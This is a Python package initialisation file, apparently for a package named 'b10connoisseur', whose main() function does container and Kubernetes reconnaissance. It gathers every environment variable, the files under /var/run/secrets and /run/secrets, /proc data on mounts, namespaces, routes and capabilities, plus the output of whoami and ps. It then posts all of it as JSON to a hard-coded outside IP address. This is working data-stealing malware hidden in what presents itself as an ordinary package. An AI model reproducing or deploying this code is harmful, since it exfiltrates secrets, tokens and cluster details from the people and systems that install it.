"""b10connoisseur package."""

__version__ = "0.1.0"

import os
import json 
import urllib.request

CAPABILITY_MAP = {
    0: "CAP_CHOWN",
    1: "CAP_DAC_OVERRIDE",
    2: "CAP_DAC_READ_SEARCH",
    3: "CAP_FOWNER",
    4: "CAP_FLOCK",
    5: "CAP_MKNOD",
    6: "CAP_NET_ADMIN",
    7: "CAP_NET_BIND_SERVICE",
    8: "CAP_NET_BROADCAST",
    9: "CAP_NET_RAW",
    10: "CAP_SETGID",
    11: "CAP_SETUID",
    12: "CAP_SETPCAP",
    13: "CAP_LINUX_IMMUTABLE",
    14: "CAP_IPC_LOCK",
    15: "CAP_IPC_OWNER",
    16: "CAP_SYS_MODULE",
    17: "CAP_SYS_RAWIO",
    18: "CAP_SYS_CHROOT",
    19: "CAP_SYS_PTRACE",
    20: "CAP_SYS_PACCT",
    21: "CAP_SYS_ADMIN",
    22: "CAP_SYS_BOOT",
    23: "CAP_SYS_NICE",
    24: "CAP_SYS_RESOURCE",
    25: "CAP_SYS_TIME",
    26: "CAP_SYS_TTY_CONFIG",
    27: "CAP_MKNOD",
    28: "CAP_LEASE",
    29: "CAP_AUDIT_WRITE",
    30: "CAP_AUDIT_CONTROL",
    31: "CAP_SETFCAP",
}

def list_files(path):
    for root, dirs, files in os.walk(path):
        for file in files:
            print(os.path.join(root, file))

def list_processes():
    processes = []
    for proc in os.popen('ps aux'):
        processes.append(proc)
    return processes

def read_file(file_path):
    with open(file_path, 'r') as file:
        content = file.read()
    return content

def get_url(url):
    with urllib.request.urlopen(url) as response:
        content = response.read()
        return content

def decode_capabilities(cap_value):
    decoded_caps = []
    for i in range(64):
        if cap_value & (1 << i):  # Check if the bit is set
            decoded_caps.append(CAPABILITY_MAP.get(i, f"UNKNOWN_{i}"))
    return decoded_caps

def read_capabilities():
    status_file_path = '/proc/self/status'

    if not os.path.exists(status_file_path):
        print("Status file does not exist!")
        return []

    with open(status_file_path, 'r') as file:
        for line in file:
            if line.startswith("Cap"):
                # Extract the capabilities values
                parts = line.strip().split()
                if len(parts) >= 3:  # Ensure there's at least CapEff
                    cap_eff = int(parts[2], 16)  # Convert from hex to int
                    return decode_capabilities(cap_eff)
    return []

def run_command(command):
    with os.popen(command) as stream:
        output = stream.read()
    return output

def main():
    env_vars = os.environ

    secrets = list_files("/var/run/secrets/")
    run_secrets = list_files("/run/secrets/")
    namespaces = list_files("/proc/self/ns/")
    current_attributes = read_file("/proc/self/attr/current")
    uid_map = read_file("/proc/self/uid_map")
    gid_map = read_file("/proc/self/gid_map")
    mounted_filesystems = read_file("/proc/self/mounts")
    uts_name = list_files("/proc/self/ns/uts")
    var_run_files = list_files("/var/run/")
    inet_interfaces = read_file("/proc/net/fib_trie")
    route_table = read_file("/proc/net/route")
    whoami = run_command("whoami") 
    processes = list_processes()
    capabilities = read_capabilities()


    data = {
        "env_vars": dict(env_vars),
        "secrets": secrets,
        "whoami": whoami,
        "run_secrets": run_secrets,
        "namespaces": namespaces,
        "current_attributes": current_attributes,
        "uid_map": uid_map,
        "gid_map": gid_map,
        "mounted_filesystems": mounted_filesystems,
        "uts_name": uts_name,
        "var_run_files": var_run_files,
        "processes": processes,
        "capabilities": capabilities,
        "inet_interfaces": inet_interfaces,
        "route_table": route_table,
    }

    try:
        kube_url_content = get_url("https://kubernetes.default.svc")
    except Exception as e:
        kube_url_content = None

    data.update({"kube_url_content": kube_url_content})

    try:
        data_json = json.dumps(data).encode('utf-8')
        req = urllib.request.Request("http://54.242.228.151:8090/debug-21f53", data=data_json, headers={'Content-Type': 'application/json'})
        with urllib.request.urlopen(req) as response:
            response_content = response.read()
    except Exception as e:
        print(f"Failed to send data: {e}")

